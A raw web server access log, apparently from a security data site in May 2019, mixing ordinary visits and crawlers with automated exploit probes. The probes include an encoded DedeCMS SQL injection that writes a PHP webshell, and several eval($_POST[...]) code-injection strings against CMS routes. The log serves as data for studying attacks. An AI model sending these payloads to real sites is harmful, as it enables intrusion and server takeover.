188.84.26.33 - - [14/May/2019:04:43:22 -0700] "GET /self.logs/access.log.2017-01-01.gz HTTP/1.1" 200 17655 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
188.84.26.33 - - [14/May/2019:04:43:23 -0700] "GET /self.logs/access.log.2017-01-02.gz HTTP/1.1" 200 26822 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
188.84.26.33 - - [14/May/2019:04:43:24 -0700] "GET /self.logs/access.log.2017-01-03.gz HTTP/1.1" 200 40944 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
159.69.138.243 - - [14/May/2019:04:44:43 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36" 
103.251.99.214 - - [14/May/2019:04:46:04 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4098.3 Safari/537.36" 
103.251.99.214 - - [14/May/2019:04:46:05 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4098.3 Safari/537.36" 
103.251.99.214 - - [14/May/2019:04:46:05 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4098.3 Safari/537.36" 
106.11.222.198 - - [14/May/2019:04:46:10 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (Linux; Android 7.0; VIE-AL10 Build/HUAWEIVIE-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 baidubrowser/7.12.12.0 (Baidu; P1 7.0)" 
103.251.99.214 - - [14/May/2019:04:46:10 -0700] "GET /Datasets%20Description/Network/tunnel.html HTTP/1.1" 200 1364 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4098.3 Safari/537.36" 
103.251.99.214 - - [14/May/2019:04:46:10 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/Datasets%20Description/Network/tunnel.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4098.3 Safari/537.36" 
106.11.223.12 - - [14/May/2019:04:46:11 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Linux; Android 7.0; VIE-AL10 Build/HUAWEIVIE-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 baidubrowser/7.12.12.0 (Baidu; P1 7.0)" 
106.11.222.181 - - [14/May/2019:04:46:22 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Linux; Android 7.0; VIE-AL10 Build/HUAWEIVIE-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 baidubrowser/7.12.12.0 (Baidu; P1 7.0)" 
134.190.190.109 - - [14/May/2019:04:51:58 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
134.190.190.109 - - [14/May/2019:04:51:58 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
134.190.190.109 - - [14/May/2019:04:51:58 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
134.190.190.109 - - [14/May/2019:04:51:58 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
134.190.190.109 - - [14/May/2019:04:51:59 -0700] "GET / HTTP/1.1" 200 12510 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
134.190.190.109 - - [14/May/2019:04:51:59 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
134.190.190.109 - - [14/May/2019:04:51:59 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
134.190.190.109 - - [14/May/2019:04:51:59 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
103.251.99.214 - - [14/May/2019:04:56:37 -0700] "GET /Datasets%20Description/Network/tunnel.html HTTP/1.1" 304 188 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4098.3 Safari/537.36" 
103.251.99.214 - - [14/May/2019:04:56:38 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/Datasets%20Description/Network/tunnel.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4098.3 Safari/537.36" 
106.11.222.169 - - [14/May/2019:04:56:50 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-N9100 Build/LRX22C) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/13G35 UCBrowser/11.5.4.970 Mobile  Tx(TUnionSDK/0.1.15)" 
106.11.222.79 - - [14/May/2019:04:56:51 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-N9100 Build/LRX22C) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/13G35 UCBrowser/11.5.4.970 Mobile  Tx(TUnionSDK/0.1.15)" 
106.11.222.207 - - [14/May/2019:04:57:02 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-N9100 Build/LRX22C) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/13G35 UCBrowser/11.5.4.970 Mobile  Tx(TUnionSDK/0.1.15)" 
61.129.8.179 - - [14/May/2019:05:04:08 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 280320 "-" "Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI ALE-CL00 Build/HuaweiALE-CL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043024 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" 
157.55.39.53 - - [14/May/2019:05:05:07 -0700] "GET /self.logs/error.log.2017-05-12.gz HTTP/1.1" 301 544 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
47.92.89.183 - - [14/May/2019:05:05:49 -0700] "GET /admin/ueditor/php/controller.php HTTP/1.1" 404 295 "http://www.secrepo.com/admin/ueditor/php/controller.php" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" 
119.7.72.34 - - [14/May/2019:05:07:36 -0700] "HEAD / HTTP/1.1" 200 295 "http://www.tudinet.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html\xa3\xa9" 
119.7.72.34 - - [14/May/2019:05:07:37 -0700] "GET //plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 HTTP/1.1" 418 731 "http://www.tudinet.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html\xa3\xa9" 
119.7.72.34 - - [14/May/2019:05:07:39 -0700] "GET //plus/moon.php HTTP/1.1" 404 295 "http://www.tudinet.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html\xa3\xa9" 
157.55.39.229 - - [14/May/2019:05:08:43 -0700] "GET /self.logs/error.log.2018-03-29.gz HTTP/1.1" 200 4179 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.53 - - [14/May/2019:05:11:34 -0700] "GET /self.logs/access.log.2018-12-04.gz HTTP/1.1" 200 28682 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
100.43.90.103 - - [14/May/2019:05:12:32 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
141.8.142.129 - - [14/May/2019:05:12:36 -0700] "GET /self.logs/2016/?C=M;O=D HTTP/1.1" 200 8020 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexMobileBot/3.0; +http://yandex.com/bots)" 
157.55.39.233 - - [14/May/2019:05:13:32 -0700] "GET /self.logs/2016/error.log.2016-01-31.gz HTTP/1.1" 200 622 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.53 - - [14/May/2019:05:14:24 -0700] "GET /self.logs/access.log.2018-07-17.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
51.83.36.53 - - [14/May/2019:05:19:12 -0700] "GET / HTTP/1.1" 200 46413 "-" "-" 
35.236.111.54 - - [14/May/2019:05:27:01 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
35.236.111.54 - - [14/May/2019:05:27:01 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
35.236.111.54 - - [14/May/2019:05:27:02 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27751 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
35.236.111.54 - - [14/May/2019:05:27:03 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7391 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
216.244.66.245 - - [14/May/2019:05:27:58 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
41.223.160.131 - - [14/May/2019:05:31:07 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
66.249.64.47 - - [14/May/2019:05:33:35 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Googlebot-Image/1.0" 
223.104.90.196 - - [14/May/2019:05:34:18 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3724.8 Safari/537.36" 
223.104.90.196 - - [14/May/2019:05:34:18 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3724.8 Safari/537.36" 
223.104.90.196 - - [14/May/2019:05:34:18 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3724.8 Safari/537.36" 
41.223.160.131 - - [14/May/2019:05:35:37 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
157.55.39.206 - - [14/May/2019:05:36:22 -0700] "GET /self.logs/error.log.2017-02-03.gz HTTP/1.1" 200 778 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
223.237.31.211 - - [14/May/2019:05:38:02 -0700] "GET /self.logs/ HTTP/1.1" 200 16439 "-" "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.0.9beta" 
115.254.39.21 - - [14/May/2019:05:39:43 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
115.254.39.21 - - [14/May/2019:05:39:44 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
115.254.39.21 - - [14/May/2019:05:39:46 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
115.254.39.21 - - [14/May/2019:05:39:47 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
123.63.49.81 - - [14/May/2019:05:39:54 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko" 
115.254.39.21 - - [14/May/2019:05:40:09 -0700] "GET /self.logs/ HTTP/1.1" 200 16439 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
123.63.49.81 - - [14/May/2019:05:40:12 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko" 
115.254.39.21 - - [14/May/2019:05:40:39 -0700] "GET /self.logs/2016/ HTTP/1.1" 200 7741 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
115.254.39.21 - - [14/May/2019:05:41:06 -0700] "GET /self.logs/2016/access.log.2016-10-16.gz HTTP/1.1" 200 10473 "http://www.secrepo.com/self.logs/2016/" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
103.123.161.21 - - [14/May/2019:05:42:20 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 295 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:21 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 294 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:21 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:21 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:21 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 294 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:22 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 294 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:22 -0700] "GET /plus/moon.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:22 -0700] "GET /plus/moon.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:23 -0700] "POST /plus/90sec.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:24 -0700] "POST /plus/90sec.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:24 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:24 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:25 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:25 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:25 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:25 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:26 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:26 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:26 -0700] "GET /web/new/fenlei/search.php?mid=1&action=search&keyword=asd&postdb%5Bcity_id%5D=../../admin/hack&hack=jfadmin&action=addjf&Apower%5Bjfadmin_mod%5D=1&fid=1&title=$%7Beval($_POST%5Blequ%5D)%7D HTTP/1.1" 404 294 "http://www.secrepo.com/web/new/fenlei/search.php?mid=1&action=search&keyword=asd&postdb[city_id]=../../admin/hack&hack=jfadmin&action=addjf&Apower[jfadmin_mod]=1&fid=1&title=${eval($_POST[lequ])}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:26 -0700] "GET /web/new/fenlei/search.php?mid=1&action=search&keyword=asd&postdb%5Bcity_id%5D=../../admin/hack&hack=jfadmin&action=addjf&Apower%5Bjfadmin_mod%5D=1&fid=1&title=$%7Beval($_POST%5Blequ%5D)%7D HTTP/1.1" 404 294 "http://www.secrepo.com/web/new/fenlei/search.php?mid=1&action=search&keyword=asd&postdb[city_id]=../../admin/hack&hack=jfadmin&action=addjf&Apower[jfadmin_mod]=1&fid=1&title=${eval($_POST[lequ])}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:27 -0700] "POST /web/new/fenlei/do/jf.php HTTP/1.1" 404 294 "http://www.secrepo.com/web/new/fenlei/do/jf.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:27 -0700] "POST /web/new/fenlei/do/jf.php HTTP/1.1" 404 294 "http://www.secrepo.com/web/new/fenlei/do/jf.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:27 -0700] "POST /index.php?m=vote&c=index&a=post&subjectid=236&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=vote&c=index&a=post&subjectid=236&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:28 -0700] "POST /index.php?m=vote&c=index&a=post&subjectid=236&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=vote&c=index&a=post&subjectid=236&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:28 -0700] "GET /index.php?m=vote&c=index&a=result&subjectid=236&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=vote&c=index&a=result&subjectid=236&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:28 -0700] "GET /index.php?m=vote&c=index&a=result&subjectid=236&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=vote&c=index&a=result&subjectid=236&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:28 -0700] "POST /fuck.php HTTP/1.1" 404 294 "http://www.secrepo.com/fuck.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:29 -0700] "POST /fuck.php HTTP/1.1" 404 294 "http://www.secrepo.com/fuck.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:29 -0700] "POST /wp-content/plugins/mailpress/mp-includes/action.php HTTP/1.1" 404 294 "http://www.secrepo.com/wp-content/plugins/mailpress/mp-includes/action.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:30 -0700] "POST /wp-content/plugins/mailpress/mp-includes/action.php HTTP/1.1" 404 294 "http://www.secrepo.com/wp-content/plugins/mailpress/mp-includes/action.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:30 -0700] "POST /wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id= HTTP/1.1" 404 294 "http://www.secrepo.com/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id=" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:30 -0700] "POST /wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id= HTTP/1.1" 404 294 "http://www.secrepo.com/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id=" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:30 -0700] "POST /index.php/module/aciton/param1/%7B$%7Beval($_POST%5Bs%5D)%7D%7D HTTP/1.1" 404 294 "http://www.secrepo.com/index.php/module/aciton/param1/{${eval($_POST[s])}}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:30 -0700] "POST /index.php/module/aciton/param1/%7B$%7Beval($_POST%5Bs%5D)%7D%7D HTTP/1.1" 404 294 "http://www.secrepo.com/index.php/module/aciton/param1/{${eval($_POST[s])}}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:31 -0700] "POST /index.php/index/index/name/%7B$%7Beval($_POST%5Bs%5D)%7D%7D HTTP/1.1" 404 294 "http://www.secrepo.com/index.php/index/index/name/{${eval($_POST[s])}}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:31 -0700] "POST /index.php/index/index/name/%7B$%7Beval($_POST%5Bs%5D)%7D%7D HTTP/1.1" 404 294 "http://www.secrepo.com/index.php/index/index/name/{${eval($_POST[s])}}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
